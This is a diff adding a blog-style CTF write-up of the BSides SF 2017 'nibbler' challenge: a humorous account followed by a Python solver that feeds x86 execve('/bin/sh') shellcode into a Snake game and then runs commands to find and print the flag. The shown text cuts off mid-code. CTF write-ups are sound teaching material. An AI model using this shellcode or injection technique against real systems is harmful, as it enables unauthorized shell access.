@@ -1,0 +1,369 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+        <meta charset="utf-8" />
+        <title>BSIDES CTF 2017 - nibbler writeup</title>
+        <link rel="stylesheet" href="http://karabut.com/theme/css/main.css" />
+        <link href="http://karabut.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="Trickery Index Atom Feed" />
+
+        <!--[if IE]>
+            <script src="https://html5shiv.googlecode.com/svn/trunk/html5.js"></script>
+        <![endif]-->
+</head>
+
+<body id="index" class="home">
+        <header id="banner" class="body">
+                <a href="http://karabut.com/"><img title="Trickery Index: Ratmir Karabut's personal page" src="/images/trickery_banner.png"></a>
+                <nav><ul>
+                    <li class="active"><a href="http://karabut.com/category/ctf-writeups.html">CTF Writeups</a></li>
+                    <li><a href="http://karabut.com/artwork.html">Artwork</a></li>
+                </ul></nav>
+        </header><!-- /#banner -->
+        <section id="extras" class="body">
+                <div class="social">
+                        <h2>social</h2>
+                        <ul>
+                            <li><a href="http://karabut.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate">atom feed</a></li>
+
+                            <li><a href="https://twitter.com/rkarabut">Twitter</a></li>
+                        </ul>
+                </div><!-- /.social -->
+        </section><!-- /#extras -->
+
+<section id="content" class="body">
+  <article>
+    <header>
+        <p class="meta">
+            <time class="published" datetime="2017-02-16T00:00:00+03:00">
+                16/02/2017
+            </time>
+        <br>
+        <br>
+        <span style="float: right;"><a href="https://twitter.com/share" class="twitter-share-button" data-count="horizontal" data-via="rkarabut">Tweet</a><script type="text/javascript" src="https://platform.twitter.com/widgets.js"></script>
+</span>
+        </p>
+
+      <h1 class="entry-title">
+        <a href="http://karabut.com/bsides-ctf-2017-nibbler-writeup.html" rel="bookmark"
+           title="Permalink to BSIDES CTF 2017 - nibbler writeup">BSIDES CTF 2017 - nibbler writeup</a></h1>
+    </header>
+
+    <div class="entry-content">
+      <p>Alright. Alright, I'm doing this one.</p>
+<p>So for the nibbler challenge we've got something pretty simple - a source code of basically a <a href="https://en.wikipedia.org/wiki/Snake_(video_game)">Snake game</a>, with a little bit of a twist in that instead of your usual score items the snake eats literally nibbles, or 4-bit chunks of data, that increment their value every tick while on the field (wrapping around of course) and stores them consequentially in memory that gets executed at the time of its death. </p>
+<p>There's also a randomly appearing single-tile obstacle.</p>
+<p>Well how about that.</p>
+<p>So first thing you should do when encountering a challenge like this one is consider your own sanity for a spell and decide if you really want to sacrifice a bit of it for the privilege of solving the puzzle. Then, possibly get a drink. Then, devise your strategy. Here's mine!</p>
+<p><img alt="Nibbler Strategy" src="http://karabut.com/images/bsidessf-2017-nibbler-strategy-600.png"></p>
+<p>I hope you got all that!</p>
+<p>Really, though, once I got my code working (well, more or less), it became soulwrenchingly apparent that the network latency would probably be the ultimate reason of my loyal nibblers' untimely deaths. </p>
+<p>So I increased the tick period to a whole whopping second, which made my nibblers crawl and very slowly get a test shellcode nibble by nibble (I needed just a simple write call to prove the point -- and dump the contents of a register for some information -- at first), but still not one was able to string even those 13 bytes together. Was there really any hope of getting 23 then, which had been my target shellcode's size at the time? Sometimes it was a bug or an oversight in the code (like ignoring wraparound while evading the obstacle, notably), sometimes it was plain bad luck (turns out the target -- or the obstacle -- could just appear in the middle of the snake, confusing the hell out of it), but most of the times it was just lag -- brutish, angry, unavoidable lag happening just once at some point when the snake should have turned but suddenly was moving straight to its another certain gory death. Dropping the tick to even 800ms had been purely unthinkable, and every try took A LOT OF TIME. And of course I had to look for any unexpected deviations in the nibblers' behaviour that could possibly spell failure in future, fixing them one after another.</p>
+<p>Let me just tell you there were a lot of them. After all's said and done, I promise to present you with the whole ghastly mess that I proudly call my nibbler code, uncut and unabridged. You are every bit as deserving of gazing into it as I were at that moment, or really any particular moment of solving this freakish abomination, suffering of harsh sleep deprivation (please put up the right time on the ctftime.org next time! thank you!), whispering to my nibblers chugging through the terminal tabs, encouraging them, mourning over their dead elongated (but not quite enough, never enough) bodies.</p>
+<p>But it will have to wait. Don't go anywhere.</p>
+<p>After some time of engaging in this miserable waste of time, my already failing brain got to the point where through some miracle of pattern-matching it at last realized we were going to need a US-based VPS for this. Me and my poor sweet, precious nibblers.</p>
+<p>The first kind soul I could reach who had a VPS at that point of time was Vlad Roskov of LC/BC (who didn't participate in BSIDES), who provided me with access to a shell located somewhere in Dallas and also advised me on using a shellcode of 21 and not 23 characters with his blessings. I, of course, gladly accepted these wondrous gifts, and we also had a bit of a delightful discussion on using two-stage payloads (sadly, already proven to fail even locally for some unidentifiable, at least in my state then present, reasons) and dumping the registers to identify possibilities of shearing a byte or two off the shellcode. I was already on that while trying out my shiny new VPS at a whopping 200ms tick, and it worked for what's it worth, but again, for some unknown reasons not zeroeing out <code>ebx</code>, which had been definitely zero every time I checked, led to the actual shellcode failing. Maybe sometime I will get into that, but not now. Not now.</p>
+<p>And lo, my army of nibblers started working their tails off (or rather, working them up), led directly into the rear of the enemy, eager to strike at its heart and gouge the bloody flag out of it! One after another their fell, sacrificing their lives, full of beauty and sophistication, for that grisly deed which did not become them, for their duty and honor. I saw Charlotte die horribly when the lag got her at last, crashing her into an obstacle when she was already forty nibbles long; I saw Marlene wringing in desperation when a target burst right through her midriff, catching her off-guard and sending her into dreadful craze; I saw Gwendolyn take an ultimate misstep, skipping a fateful tick and launching to forever wander the seventeenth column of the sorrowful field.</p>
+<p>And then... And then I saw Deirdre reach for the final nibble.</p>
+<p><em>Remember my instructions</em>, I whispered. I knew she couldn't hear me now. <em>Remember!</em> I cried.</p>
+<p>I saw her list the directory, doing her first reconaissance. I saw her find the flag.</p>
+<p>And then I saw her cat it.</p>
+<p>I knew I'll never see her again.</p>
+<p><center>
+<img alt="Deirdre" src="http://karabut.com/images/bsidessf-2017-nibbler-deirdre.png">
+</center></p>
+<h2>The Holy Code of Martyr Saint Deirdre</h2>
+<div class="highlight"><pre><span></span><span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">time</span>
+<span class="kn">import</span> <span class="nn">re</span>
+<span class="kn">import</span> <span class="nn">binascii</span>
+<span class="kn">import</span> <span class="nn">sys</span>
+
+<span class="n">target_re</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s2">&quot;([\da-f]{2})&quot;</span><span class="p">)</span>
+<span class="n">score_re</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">compile</span><span class="p">(</span><span class="s2">&quot;Score: &quot;</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="n">end</span><span class="p">):</span>
+    <span class="n">buf</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">while</span> <span class="n">data</span><span class="p">:</span>
+        <span class="n">buf</span> <span class="o">+=</span> <span class="n">data</span>
+        <span class="k">if</span> <span class="n">buf</span><span class="o">.</span><span class="n">endswith</span><span class="p">(</span><span class="n">end</span><span class="p">):</span>
+            <span class="k">return</span> <span class="n">buf</span>
+        <span class="n">data</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
+    <span class="k">return</span> <span class="n">buf</span>
+
+<span class="c1">#shellcode = &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;</span>
+
+<span class="c1"># test edx</span>
+<span class="c1">#shellcode = &quot;\x6a\x04\x58\x6a\x01\x5b\x83\xc2\x1e\x52\x89\xe1\xcd\x80&quot;</span>
+<span class="c1">#binsh = &quot;\x6a\x0b\x58\x99\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\xcd\x80&quot;</span>
+<span class="c1">#test eax </span>
+<span class="c1">#shellcode = &quot;\x50\x89\xE1\x6A\x04\x58\x89\xC2\x6A\x01\x5B\xCD\x80&quot;</span>
+<span class="c1">#test ebx </span>
+<span class="c1">#shellcode = &quot;\x53\x89\xE1\x6A\x04\x58\x89\xC2\x6A\x01\x5B\xCD\x80&quot;</span>
+<span class="c1">#test ecx </span>
+<span class="c1">#shellcode = &quot;\x51\x89\xE1\x6A\x04\x58\x89\xC2\x6A\x01\x5B\xCD\x80&quot;</span>
+<span class="c1">#test edx </span>
+<span class="c1">#shellcode = &quot;\x52\x89\xE1\x6A\x04\x58\x89\xC2\x6A\x01\x5B\xCD\x80&quot;</span>
+
+<span class="c1">#shellcode = &quot;\x6A\x0B\x58\x53\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\x31\xC9\xCD\x80&quot;</span>
+<span class="n">shellcode</span> <span class="o">=</span> <span class="s2">&quot;</span><span class="se">\x6A\x0B\x58\x99\x52\x68\x6E\x2F\x73\x68\x68\x2F\x2F\x62\x69\x89\xE3\x31\xC9\xCD\x80</span><span class="s2">&quot;</span>
+<span class="c1">#read 2nd stage from stdin</span>
+<span class="c1">#shellcode = &quot;\x50\x59\x6A\x03\x58\x6A\x28\x5A\xCD\x80&quot;</span>
+
+
+<span class="c1">#shellcode = &quot;\x6a\x0b\x58\x99\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x31\xc9\xcd\x80&quot;</span>
+<span class="n">s</span> <span class="o">=</span> <span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">()</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&quot;nibbler-e2cf50d6.ctf.bsidessf.net&quot;</span><span class="p">,</span> <span class="mi">1338</span><span class="p">))</span>
+
+<span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;200000</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="c1">#s.send(&quot;e\n&quot;)</span>
+
+<span class="n">last_cmd</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="k">def</span> <span class="nf">turn</span><span class="p">(</span><span class="n">d</span><span class="p">):</span>
+    <span class="n">last_cmd</span> <span class="o">=</span> <span class="n">d</span>
+    <span class="k">print</span> <span class="s2">&quot;Cmd: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">d</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>
+    <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">d</span><span class="p">)</span>
+
+<span class="n">tick</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">loop_tick</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">on_target</span> <span class="o">=</span> <span class="bp">False</span>
+<span class="n">old_score</span> <span class="o">=</span> <span class="s2">&quot;&quot;</span>
+<span class="n">target_step</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">target_queue</span> <span class="o">=</span> <span class="p">[]</span>
+<span class="n">shellcode_step</span> <span class="o">=</span> <span class="mi">0</span>
+<span class="n">high_nibble</span> <span class="o">=</span> <span class="bp">True</span>
+<span class="n">shellcode_nibble</span> <span class="o">=</span> <span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">shellcode</span><span class="p">[</span><span class="mi">0</span><span class="p">])</span> <span class="o">&amp;</span> <span class="mh">0xf0</span><span class="p">)</span> <span class="o">&gt;&gt;</span> <span class="mi">4</span>
+<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
+    <span class="n">screen</span> <span class="o">=</span> <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="s2">&quot;right</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+    <span class="n">lines</span> <span class="o">=</span> <span class="n">screen</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s2">&quot;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+
+    <span class="n">score_line</span> <span class="o">=</span> <span class="bp">None</span>
+    <span class="k">for</span> <span class="n">i</span><span class="p">,</span> <span class="n">l</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">lines</span><span class="p">):</span>
+        <span class="k">if</span> <span class="s2">&quot;Score&quot;</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
+            <span class="n">score_line</span> <span class="o">=</span> <span class="n">i</span>
+
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">score_line</span><span class="p">:</span>
+            <span class="k">print</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">lines</span><span class="p">)</span>
+            <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+
+
+    <span class="k">if</span> <span class="n">shellcode_step</span> <span class="o">==</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">body_up</span><span class="p">:</span>
+            <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;w</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="k">elif</span> <span class="n">body_down</span><span class="p">:</span>
+            <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;s</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="k">print</span> <span class="n">recvuntil</span><span class="p">(</span><span class="n">s</span><span class="p">,</span> <span class="s2">&quot;Thanks for playing!</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+<span class="c1">#        s.send(&#39;A&#39;*10 + binsh + &quot;\n&quot;)</span>
+<span class="c1">#        data = s.recv(1024)</span>
+<span class="c1">#        print data</span>
+ <span class="c1">#      print binascii.hexlify(data)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;ls</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+        <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="s2">&quot;find | grep flag | xargs cat</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">)</span>
+        <span class="k">print</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
+
+        <span class="n">sys</span><span class="o">.</span><span class="n">exit</span><span class="p">()</span>
+    <span class="n">score</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">lines</span><span class="p">[</span><span class="n">score_line</span><span class="p">]</span><span class="o">.</span><span class="n">split</span><span class="p">(</span><span class="s1">&#39; &#39;</span><span class="p">)[</span><span class="mi">1</span><span class="p">:])</span>
+    <span class="k">print</span> <span class="n">binascii</span><span class="o">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">score</span><span class="p">)</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">score</span> <span class="o">!=</span> <span class="n">old_score</span><span class="p">)</span> <span class="ow">and</span> <span class="n">on_target</span> <span class="o">==</span> <span class="bp">True</span><span class="p">:</span>
+        <span class="k">print</span> <span class="s2">&quot;Score changed! </span><span class="si">%s</span><span class="s2"> -&gt; </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">old_score</span><span class="p">,</span> <span class="n">score</span><span class="p">)</span>
+        <span class="n">on_target</span> <span class="o">=</span> <span class="bp">False</span>
+        <span class="n">old_score</span> <span class="o">=</span> <span class="n">score</span>
+        <span class="n">high_nibble</span> <span class="o">=</span> <span class="ow">not</span> <span class="n">high_nibble</span>
+        <span class="n">shellcode_step</span> <span class="o">+=</span> <span class="mi">1</span>
+        <span class="k">if</span> <span class="n">shellcode_step</span> <span class="o">&lt;</span> <span class="nb">len</span><span class="p">(</span><span class="n">shellcode</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">:</span>
+            <span class="n">shellcode_nibble</span> <span class="o">=</span> <span class="nb">ord</span><span class="p">(</span><span class="n">shellcode</span><span class="p">[</span><span class="n">shellcode_step</span><span class="o">/</span><span class="mi">2</span><span class="p">])</span>
+            <span class="k">if</span> <span class="n">shellcode_step</span><span class="o">%</span><span class="mi">2</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
+                <span class="n">shellcode_nibble</span> <span class="o">&amp;=</span> <span class="mh">0xf0</span> 
+                <span class="n">shellcode_nibble</span> <span class="o">&gt;&gt;=</span> <span class="mi">4</span>
+            <span class="k">else</span><span class="p">:</span>
+                <span class="n">shellcode_nibble</span> <span class="o">&amp;=</span> <span class="mh">0xf</span>
+
+    <span class="k">for</span> <span class="n">y</span><span class="p">,</span> <span class="n">l</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">lines</span><span class="p">[</span><span class="n">score_line</span><span class="o">+</span><span class="mi">3</span><span class="p">:</span><span class="n">score_line</span><span class="o">+</span><span class="mi">22</span><span class="p">]):</span>
+        <span class="n">m</span> <span class="o">=</span> <span class="n">target_re</span><span class="o">.</span><span class="n">search</span><span class="p">(</span><span class="n">l</span><span class="p">)</span>
+        <span class="k">if</span> <span class="n">m</span><span class="p">:</span>
+            <span class="n">target_value</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span><span class="mi">16</span><span class="p">)</span>
+            <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="n">m</span><span class="o">.</span><span class="n">group</span><span class="p">(</span><span class="mi">1</span><span class="p">))</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>
+            <span class="n">target</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="s1">&#39;@@&#39;</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
+            <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;@@&#39;</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>
+            <span class="n">snake</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+
+        <span class="k">if</span> <span class="s1">&#39;**&#39;</span> <span class="ow">in</span> <span class="n">l</span><span class="p">:</span>
+            <span class="n">x</span> <span class="o">=</span> <span class="p">(</span><span class="n">l</span><span class="o">.</span><span class="n">find</span><span class="p">(</span><span class="s1">&#39;**&#39;</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">/</span> <span class="mi">2</span>
+            <span class="n">obstacle</span> <span class="o">=</span> <span class="p">(</span><span class="n">x</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>
+
+    <span class="n">body_up</span> <span class="o">=</span> <span class="bp">False</span>
+    <span class="n">body_down</span> <span class="o">=</span> <span class="bp">False</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">lines</span><span class="p">[</span><span class="n">score_line</span><span class="o">+</span><span class="mi">3</span><span class="o">+</span><span class="n">snake</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">-</span><span class="mi">1</span><span class="p">][</span><span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;o&#39;</span>
+         <span class="ow">or</span> <span class="n">snake</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">0</span> <span class="ow">and</span> <span class="n">lines</span><span class="p">[</span><span class="n">score_line</span><span class="o">+</span><span class="mi">21</span><span class="p">][</span><span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;o&#39;</span><span class="p">):</span>
+        <span class="n">body_up</span> <span class="o">=</span> <span class="bp">True</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="n">lines</span><span class="p">[</span><span class="n">score_line</span><span class="o">+</span><span class="mi">3</span><span class="o">+</span><span class="n">snake</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="o">+</span><span class="mi">1</span><span class="p">][</span><span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;o&#39;</span>
+        <span class="ow">or</span> <span class="n">snake</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="mi">22</span> <span class="ow">and</span> <span class="n">lines</span><span class="p">[</span><span class="n">score_line</span><span class="o">+</span><span class="mi">3</span><span class="p">][</span><span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">*</span><span class="mi">2</span><span class="o">+</span><span class="mi">1</span><span class="p">]</span> <span class="o">==</span> <span class="s1">&#39;o&#39;</span><span class="p">):</span>
+        <span class="n">body_down</span> <span class="o">=</span> <span class="bp">True</span>
+
+
+
+    <span class="k">print</span> <span class="s1">&#39;</span><span class="se">\n</span><span class="s1">&#39;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">lines</span><span class="p">[</span><span class="n">score_line</span><span class="o">+</span><span class="mi">3</span><span class="p">:</span><span class="n">score_line</span><span class="o">+</span><span class="mi">22</span><span class="p">])</span>
+    <span class="k">print</span> <span class="s2">&quot;Score: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">score</span>
+    <span class="k">print</span> <span class="s2">&quot;Target value: </span><span class="si">%x</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">target_value</span>
+    <span class="k">print</span> <span class="s2">&quot;Target queue: &quot;</span> <span class="o">+</span> <span class="nb">str</span><span class="p">(</span><span class="n">target_queue</span><span class="p">)</span>
+    <span class="k">print</span> <span class="s2">&quot;Target step: </span><span class="si">%d</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="n">target_step</span>
+    <span class="k">print</span> <span class="s2">&quot;Snake: </span><span class="si">%s</span><span class="s2"> </span><span class="si">%s</span><span class="s2"> Target: </span><span class="si">%s</span><span class="s2"> </span><span class="si">%s</span><span class="s2"> Obstacle: </span><span class="si">%s</span><span class="s2"> </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">snake</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">target</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">target</span><span class="p">[</span><span class="mi">1</span><span class="p">],</span> <span class="n">obstacle</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">obstacle</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
+    <span class="k">print</span> <span class="s2">&quot;On target: </span><span class="si">%s</span><span class="s2"> Body up: </span><span class="si">%s</span><span class="s2"> Body down: </span><span class="si">%s</span><span class="s2">&quot;</span> <span class="o">%</span> <span class="p">(</span><span class="n">on_target</span><span class="p">,</span> <span class="n">body_up</span><span class="p">,</span> <span class="n">body_down</span><span class="p">)</span>
+<span class="c1">#   </span>
+    <span class="c1"># if snake[1] == target[1]:</span>
+<span class="c1">#        s.send(&quot;d\n&quot;)</span>
+<span class="c1">#    if tick%2 == 1:</span>
+    <span class="k">if</span> <span class="ow">not</span> <span class="n">on_target</span><span class="p">:</span>
+        <span class="k">if</span> <span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">target</span><span class="p">[</span><span class="mi">0</span><span class="p">]:</span>
+            <span class="c1"># check possible values</span>
+            <span class="k">if</span> <span class="ow">not</span> <span class="n">body_up</span> <span class="ow">and</span> <span class="ow">not</span> <span class="p">(</span> <span class="n">obstacle</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="ow">in</span> <span class="p">[</span><span class="n">snake</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span> <span class="n">snake</span><span class="p">[</span><span class="mi">1</span><span class="p">]]</span> <span class="ow">and</span>
+                        <span class="p">(</span>
+                        <span class="p">(</span><span class="n">obstacle</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">target</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">and</span> 
+                         <span class="n">obstacle</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">snake</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span> <span class="ow">or</span>
+                        <span class="p">(</span><span class="n">target</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">snake</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">and</span>
+                            <span class="p">(</span><span class="n">obstacle</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&lt;</span> <span class="n">snake</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">or</span> <span class="n">obstacle</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">&gt;</span> <span class="n">target</span><span class="p">[</span><span class="mi">1</span><span class="p">])))):</span> <span class="c1"># possible obstacle on the way up?</span>
+                <span class="n">delta_up</span> <span class="o">=</span> <span class="n">snake</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">-</span> <span class="n">target</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span>
+                <span class="k">if</span> <span class="n">delta_up</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
+                    <span class="n">delta_up</span> <span class="o">+=</span> <span class="mi">19</span>
+                <span class="n">possible_deltas</span> <span class="o">=</span> <span class="p">[</span><span class="n">delta_up</span><span class="p">]</span>
+                <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">((</span><span class="n">delta_up</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">/</span><span class="mi">2</span><span class="p">):</span>
+                    <span class="n">possible_deltas</span> <span class="o">+=</span> <span class="p">[</span><span class="n">delta_up</span><span class="o">+</span><span class="p">((</span><span class="n">_</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span><span class="o">*</span><span class="mi">2</span><span class="p">)]</span>
+                <span class="k">for</span> <span class="n">turns_needed</span><span class="p">,</span> <span class="n">d</span> <span class="ow">in</span> <span class="nb">enumerate</span><span class="p">(</span><span class="n">possible_deltas</span><span class="p">):</span>
+                    <span class="k">if</span> <span class="p">(</span> <span class="p">(</span><span class="n">high_nibble</span> <span class="ow">and</span> <span class="p">(</span><span class="n">target_value</span><span class="o">/</span><span class="mh">0x10</span> <span class="o">+</span> <span class="n">d</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">==</span> <span class="n">shellcode_nibble</span><span class="p">)</span>
+                            <span class="ow">or</span> 
+                        <span class="p">(</span><span class="ow">not</span> <span class="n">high_nibble</span> <span class="ow">and</span> <span class="p">(</span><span class="n">target_value</span> <span class="o">+</span> <span class="n">d</span><span class="p">)</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">==</span> <span class="n">shellcode_nibble</span><span class="p">))</span>  <span class="p">:</span>
+                        <span class="n">target_queue</span> <span class="o">=</span> <span class="p">[]</span>
+                        <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">turns_needed</span><span class="p">):</span>
+                            <span class="n">target_queue</span> <span class="o">+=</span> <span class="p">[</span><span class="s2">&quot;d</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;w</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;a</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;w</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">]</span>
+                        <span class="k">if</span> <span class="n">target_queue</span><span class="p">:</span>
+                            <span class="n">target_queue</span> <span class="o">=</span> <span class="n">target_queue</span><span class="p">[:</span><span class="o">-</span><span class="mi">1</span><span class="p">]</span>
+                        <span class="n">target_queue</span> <span class="o">+=</span> <span class="p">[</span><span class="s2">&quot;w</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">]</span>
+
+                        <span class="k">if</span> <span class="n">d</span> <span class="o">==</span> <span class="n">possible_deltas</span><span class="p">[</span><span class="o">-</span><span class="mi">1</span><span class="p">]:</span>
+                            <span class="n">target_queue</span> <span class="o">+=</span> <span class="p">[</span><span class="s2">&quot;d</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">,</span><span class="s2">&quot;w</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">]</span>
+
